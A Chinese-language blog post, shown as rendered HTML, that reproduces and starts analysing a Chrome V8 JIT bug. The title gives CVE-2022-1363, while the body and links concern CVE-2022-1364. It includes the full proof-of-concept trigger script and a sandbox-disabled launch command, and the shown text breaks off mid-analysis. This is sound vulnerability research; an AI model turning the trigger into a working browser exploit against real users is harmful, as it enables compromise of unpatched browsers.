<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>分析 CVE-2022-1363 | My New Hugo Site</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="从 https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html 得到漏洞影响的 Chrome 版本以及 POC 代码。
复现
从 https://vikyd.github.io/download-chromium-history-version/#/ 搜索到一个距修复版本比较近的版本 100.0.4896.124 的官方备份 https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/972766/
./Chrome.exe &ndash;js-flags=&quot;&ndash;allow-natives-syntax&quot; &ndash;no-sandbox &ndash;enable-logging=stderr 启动 Chrome，访问 POC 页面 index.html。
&lt;body&gt;
&lt;script&gt;
        function foo(bug) {
  function C(z) {
    Error.prepareStackTrace = function(t, B) {
      return B[z].getThis();
    };
    let p = Error().stack;
    Error.prepareStackTrace = null;
    return p;
  }
  function J() {}
  var optim = false;
  var opt = new Function(
      &#39;a&#39;, &#39;b&#39;, &#39;c&#39;,
      &#39;if(typeof a===\&#39;number\&#39;){if(a&gt;2){for(var i=0;i&lt;100;i&#43;&#43;);return;}b.d(a,b,1);return}&#39; &#43;
          &#39;g&#43;&#43;;&#39;.repeat(70));
  var e = null;
  J.prototype.d = new Function(
      &#39;a&#39;, &#39;b&#39;, &#39;&#34;use strict&#34;;b.a.call(arguments,b);return arguments[a];&#39;);
  J.prototype.a = new Function(&#39;a&#39;, &#39;a.b(0,a)&#39;);
  J.prototype.b = new Function(
      &#39;a&#39;, &#39;b&#39;,
      &#39;b.c();if(a){&#39; &#43;
          &#39;g&#43;&#43;;&#39;.repeat(70) &#43; &#39;}&#39;);
  J.prototype.c = function() {
    if (optim) {
      var z = C(3);
      var p = C(3);
      z[0] = 0;
      e = {M: z, C: p};
    }
  };
  var a = new J();
  // jit optim
  if (bug) {
    for (var V = 0; 1E4 &gt; V; V&#43;&#43;) {
       opt(0 == V % 4 ? 1 : 4, a, 1);
    }
  }
  optim = true;
  opt(1, a, 1);
  return e;
}

e1 = foo(false);
console.log(e1.M === e1.C); // prints true.
e2 = foo(true);
console.log(e2.M === e2.C); // should be true as above but prints false.
&lt;/script&gt;
&lt;/body&gt;
可以看到，两次 console.log 分别输出 true 和 false。">
    <meta name="generator" content="Hugo 0.139.2">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >



    

    
      

    

    

    
      <link rel="canonical" href="http://localhost:1313/posts/2023-05-07-cve-2022-1364/">
    

    <meta property="og:url" content="http://localhost:1313/posts/2023-05-07-cve-2022-1364/">
  <meta property="og:site_name" content="My New Hugo Site">
  <meta property="og:title" content="分析 CVE-2022-1363">
  <meta property="og:description" content="从 https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html 得到漏洞影响的 Chrome 版本以及 POC 代码。
复现 从 https://vikyd.github.io/download-chromium-history-version/#/ 搜索到一个距修复版本比较近的版本 100.0.4896.124 的官方备份 https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/972766/
./Chrome.exe –js-flags=&#34;–allow-natives-syntax&#34; –no-sandbox –enable-logging=stderr 启动 Chrome，访问 POC 页面 index.html。
&lt;body&gt; &lt;script&gt; function foo(bug) { function C(z) { Error.prepareStackTrace = function(t, B) { return B[z].getThis(); }; let p = Error().stack; Error.prepareStackTrace = null; return p; } function J() {} var optim = false; var opt = new Function( &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;if(typeof a===\&#39;number\&#39;){if(a&gt;2){for(var i=0;i&lt;100;i&#43;&#43;);return;}b.d(a,b,1);return}&#39; &#43; &#39;g&#43;&#43;;&#39;.repeat(70)); var e = null; J.prototype.d = new Function( &#39;a&#39;, &#39;b&#39;, &#39;&#34;use strict&#34;;b.a.call(arguments,b);return arguments[a];&#39;); J.prototype.a = new Function(&#39;a&#39;, &#39;a.b(0,a)&#39;); J.prototype.b = new Function( &#39;a&#39;, &#39;b&#39;, &#39;b.c();if(a){&#39; &#43; &#39;g&#43;&#43;;&#39;.repeat(70) &#43; &#39;}&#39;); J.prototype.c = function() { if (optim) { var z = C(3); var p = C(3); z[0] = 0; e = {M: z, C: p}; } }; var a = new J(); // jit optim if (bug) { for (var V = 0; 1E4 &gt; V; V&#43;&#43;) { opt(0 == V % 4 ? 1 : 4, a, 1); } } optim = true; opt(1, a, 1); return e; } e1 = foo(false); console.log(e1.M === e1.C); // prints true. e2 = foo(true); console.log(e2.M === e2.C); // should be true as above but prints false. &lt;/script&gt; &lt;/body&gt; 可以看到，两次 console.log 分别输出 true 和 false。">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">

  <meta itemprop="name" content="分析 CVE-2022-1363">
  <meta itemprop="description" content="从 https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html 得到漏洞影响的 Chrome 版本以及 POC 代码。
复现 从 https://vikyd.github.io/download-chromium-history-version/#/ 搜索到一个距修复版本比较近的版本 100.0.4896.124 的官方备份 https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/972766/
./Chrome.exe –js-flags=&#34;–allow-natives-syntax&#34; –no-sandbox –enable-logging=stderr 启动 Chrome，访问 POC 页面 index.html。
&lt;body&gt; &lt;script&gt; function foo(bug) { function C(z) { Error.prepareStackTrace = function(t, B) { return B[z].getThis(); }; let p = Error().stack; Error.prepareStackTrace = null; return p; } function J() {} var optim = false; var opt = new Function( &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;if(typeof a===\&#39;number\&#39;){if(a&gt;2){for(var i=0;i&lt;100;i&#43;&#43;);return;}b.d(a,b,1);return}&#39; &#43; &#39;g&#43;&#43;;&#39;.repeat(70)); var e = null; J.prototype.d = new Function( &#39;a&#39;, &#39;b&#39;, &#39;&#34;use strict&#34;;b.a.call(arguments,b);return arguments[a];&#39;); J.prototype.a = new Function(&#39;a&#39;, &#39;a.b(0,a)&#39;); J.prototype.b = new Function( &#39;a&#39;, &#39;b&#39;, &#39;b.c();if(a){&#39; &#43; &#39;g&#43;&#43;;&#39;.repeat(70) &#43; &#39;}&#39;); J.prototype.c = function() { if (optim) { var z = C(3); var p = C(3); z[0] = 0; e = {M: z, C: p}; } }; var a = new J(); // jit optim if (bug) { for (var V = 0; 1E4 &gt; V; V&#43;&#43;) { opt(0 == V % 4 ? 1 : 4, a, 1); } } optim = true; opt(1, a, 1); return e; } e1 = foo(false); console.log(e1.M === e1.C); // prints true. e2 = foo(true); console.log(e2.M === e2.C); // should be true as above but prints false. &lt;/script&gt; &lt;/body&gt; 可以看到，两次 console.log 分别输出 true 和 false。">
  <meta itemprop="wordCount" content="8201">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="分析 CVE-2022-1363">
  <meta name="twitter:description" content="从 https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html 得到漏洞影响的 Chrome 版本以及 POC 代码。
复现 从 https://vikyd.github.io/download-chromium-history-version/#/ 搜索到一个距修复版本比较近的版本 100.0.4896.124 的官方备份 https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/972766/
./Chrome.exe –js-flags=&#34;–allow-natives-syntax&#34; –no-sandbox –enable-logging=stderr 启动 Chrome，访问 POC 页面 index.html。
&lt;body&gt; &lt;script&gt; function foo(bug) { function C(z) { Error.prepareStackTrace = function(t, B) { return B[z].getThis(); }; let p = Error().stack; Error.prepareStackTrace = null; return p; } function J() {} var optim = false; var opt = new Function( &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;if(typeof a===\&#39;number\&#39;){if(a&gt;2){for(var i=0;i&lt;100;i&#43;&#43;);return;}b.d(a,b,1);return}&#39; &#43; &#39;g&#43;&#43;;&#39;.repeat(70)); var e = null; J.prototype.d = new Function( &#39;a&#39;, &#39;b&#39;, &#39;&#34;use strict&#34;;b.a.call(arguments,b);return arguments[a];&#39;); J.prototype.a = new Function(&#39;a&#39;, &#39;a.b(0,a)&#39;); J.prototype.b = new Function( &#39;a&#39;, &#39;b&#39;, &#39;b.c();if(a){&#39; &#43; &#39;g&#43;&#43;;&#39;.repeat(70) &#43; &#39;}&#39;); J.prototype.c = function() { if (optim) { var z = C(3); var p = C(3); z[0] = 0; e = {M: z, C: p}; } }; var a = new J(); // jit optim if (bug) { for (var V = 0; 1E4 &gt; V; V&#43;&#43;) { opt(0 == V % 4 ? 1 : 4, a, 1); } } optim = true; opt(1, a, 1); return e; } e1 = foo(false); console.log(e1.M === e1.C); // prints true. e2 = foo(true); console.log(e2.M === e2.C); // should be true as above but prints false. &lt;/script&gt; &lt;/body&gt; 可以看到，两次 console.log 分别输出 true 和 false。">

	
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  <header>
    <div class="bg-black">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
      
        My New Hugo Site
      
    </a>
    <div class="flex-l items-center">
      

      
      <div class="ananke-socials"></div>

    </div>
  </div>
</nav>

    </div>
  </header>



    <main class="pb7" role="main">
      
  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">分析 CVE-2022-1363</h1>
      
      
      

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><p>从 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html">https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1364.html</a> 得到漏洞影响的 Chrome 版本以及 POC 代码。</p>
<h2 id="复现">复现</h2>
<p>从 <a href="https://vikyd.github.io/download-chromium-history-version/#/">https://vikyd.github.io/download-chromium-history-version/#/</a> 搜索到一个距修复版本比较近的版本 100.0.4896.124 的官方备份 <a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/972766/">https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/972766/</a></p>
<p>./Chrome.exe &ndash;js-flags=&quot;&ndash;allow-natives-syntax&quot; &ndash;no-sandbox &ndash;enable-logging=stderr 启动 Chrome，访问 POC 页面 index.html。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">foo</span>(<span style="color:#a6e22e">bug</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">C</span>(<span style="color:#a6e22e">z</span>) {
</span></span><span style="display:flex;"><span>    Error.<span style="color:#a6e22e">prepareStackTrace</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">B</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">B</span>[<span style="color:#a6e22e">z</span>].<span style="color:#a6e22e">getThis</span>();
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> Error().<span style="color:#a6e22e">stack</span>;
</span></span><span style="display:flex;"><span>    Error.<span style="color:#a6e22e">prepareStackTrace</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">p</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">J</span>() {}
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">optim</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opt</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;c&#39;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;if(typeof a===\&#39;number\&#39;){if(a&gt;2){for(var i=0;i&lt;100;i++);return;}b.d(a,b,1);return}&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;g++;&#39;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">70</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;&#34;use strict&#34;;b.a.call(arguments,b);return arguments[a];&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;a.b(0,a)&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Function(
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;b.c();if(a){&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;g++;&#39;</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">70</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">optim</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">z</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">C</span>(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">C</span>(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">z</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">M</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">z</span>, <span style="color:#a6e22e">C</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>};
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">J</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// jit optim
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bug</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">V</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#ae81ff">1E4</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">V</span>; <span style="color:#a6e22e">V</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">opt</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">V</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">4</span>, <span style="color:#a6e22e">a</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">optim</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">opt</span>(<span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">a</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">e</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">e1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">foo</span>(<span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e1</span>.<span style="color:#a6e22e">M</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">e1</span>.<span style="color:#a6e22e">C</span>); <span style="color:#75715e">// prints true.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">e2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">foo</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e2</span>.<span style="color:#a6e22e">M</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">e2</span>.<span style="color:#a6e22e">C</span>); <span style="color:#75715e">// should be true as above but prints false.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span></code></pre></div><p>可以看到，两次 console.log 分别输出 true 和 false。</p>
<h2 id="分析">分析</h2>
<p>先简单看下 POC 代码，e1 和 e2  的来源其实是 J.prototype.c 函数中的 e，可以看到 e.M 和 e.C 都是函数调用 C(3)  的返回值，再看函数 C，看起来像是在获取当前的调用栈，在临近的位置调用两次 C 函数，另外还可以看到两次 foo 函数调用的不同之处，主要在是否对 opt 函数进行 JIT 编译。</p>
<p>先看函数 C，里面用到了 Error 和 StackTrace 相关的 API，搜索到一篇相关的介绍 <a href="https://v8.dev/docs/stack-trace-api">https://v8.dev/docs/stack-trace-api</a> ，读了以后了解到，Error 对象的 stack 属性，可以用来读 Error 创建时的调用栈，这个 stack 属性是在第一次被读取时，使用 Error.prepareStackTrace 函数生成的，Error.prepareStackTrace 的两个参数分别是 Error 对象和  structuredStackTrace。structuredStackTrace 是 Callsite 对象的数组，Callsite 就记录着每一层的栈帧信息，Callsite 的 getThis 方法就可以获取到栈帧对应的 this 对象。修改 Error.prepareStackTrace 就可以自定义 stack 属性的生成。</p>
<p>这样的话在临近位置，连续调用函数 C 返回的应该就是同一层栈帧对应的 this 对象。e2.M === e2.C 应该像注释中描述的也为 true 才对。继续分析 opt 函数的 JIT 编译做了哪些优化，为什么改变了这个结果。</p>
<p>用 ./Chrome.exe &ndash;js-flags=&quot;&ndash;allow-natives-syntax &ndash;trace-turbo&quot; &ndash;no-sandbox &ndash;enable-logging=stderr 命令重新启动 chrome，访问 POC 页面后，得到编译过程的 trace 日志 ![[turbo-000000B00023E8B4-0 1.json]]，用 <a href="https://v8.github.io/tools/head/turbolizer/index.html">v8 turbolizer</a> 打开</p>
<p>opt 函数整理一下，可以写成下面的形式：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">opt</span>(<span style="color:#a6e22e">a</span>,<span style="color:#a6e22e">b</span>,<span style="color:#a6e22e">c</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">===</span><span style="color:#e6db74">&#39;number&#39;</span>){
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span><span style="color:#ae81ff">2</span>){
</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">vari</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">100</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>		        ;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">d</span>(<span style="color:#a6e22e">a</span>,<span style="color:#a6e22e">b</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>		    <span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>其中 b.d 就是 j.prototype.d 可以整理成：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">d</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">use</span> <span style="color:#a6e22e">strict</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">arguments</span>, <span style="color:#a6e22e">b</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arguments</span>[<span style="color:#a6e22e">a</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>b.a 就是 j.prototype.a 可以整理成：
function (a) {
a.b(0, a);
}</p>
<p>a.b 就是 j.prototype.b 可以整理成：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">c</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">a</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;<span style="color:#a6e22e">g</span><span style="color:#f92672">++</span>;....
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>b.c 就是 J.prototype.c 整理成：</p>
